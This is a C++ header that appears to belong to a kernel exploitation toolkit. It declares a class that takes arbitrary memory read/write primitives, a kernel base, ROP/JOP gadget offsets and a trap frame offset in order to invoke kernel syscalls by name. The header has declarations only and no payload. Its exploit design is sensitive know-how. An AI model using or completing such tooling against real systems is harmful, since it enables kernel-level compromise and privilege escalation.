#pragma once
#include "general.h"
#include <functional>
#include "framemanager.h"
#include "jopmanager.h"


class ShadowAssassin
{
private:
    std::function<uint64_t(uint64_t)>       readFn;
    std::function<void(uint64_t, uint64_t)> writeFn;

    uint64_t kernelBase;
    uint64_t gadgetJmpRax;
    uint64_t gadgetPopRspRet;
    uint64_t scratchAddress;

    FrameManager frameManager;
    JOPManager   jopManager;

    uint64_t ResolveKernelExport(const std::string& name);

public:
    ShadowAssassin();

    void SetReadPrimitive(std::function<uint64_t(uint64_t)> fn);
    void SetWritePrimitive(std::function<void(uint64_t, uint64_t)> fn);
    void SetKernelBase(uint64_t base);
    void SetGadgetJmpRax(uint64_t offset);
    void SetGadgetPopRspRet(uint64_t offset);
    void SetScratchAddress(uint64_t addr);
    void SetTrapFrameOffset(uint64_t offset);

    bool Initialize();

    uint64_t CallSyscall(const std::string& name, const std::vector<uint64_t>& params);

    FrameManager& GetFrameManager();
    JOPManager&   GetJOPManager();
};
